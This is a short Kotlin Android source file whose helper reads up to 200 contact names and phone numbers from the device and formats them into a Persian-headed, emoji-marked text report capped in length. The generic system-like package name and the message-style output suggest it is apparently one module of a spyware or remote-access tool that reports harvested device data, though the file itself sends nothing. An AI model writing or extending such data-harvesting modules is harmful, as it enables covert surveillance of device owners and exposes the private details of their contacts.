package com.sys.svc.helpers

import android.content.Context
import android.provider.ContactsContract
import com.sys.svc.Logger

object ContactsHelper {
    fun list(ctx: Context): String {
        return try {
            val cur = ctx.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )
            val sb = StringBuilder("👥 مخاطبین:\n")
            var n = 0
            cur?.use {
                while (it.moveToNext() && n < 200) {
                    val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    if (nameIdx < 0 || numIdx < 0) continue
                    sb.appendLine("• ${it.getString(nameIdx)} — ${it.getString(numIdx)}")
                    n++
                }
            }
            sb.toString().take(3200)
        } catch (e: Exception) {
            Logger.e("Contacts", "", e)
            "❌ ${e.message}"
        }
    }
}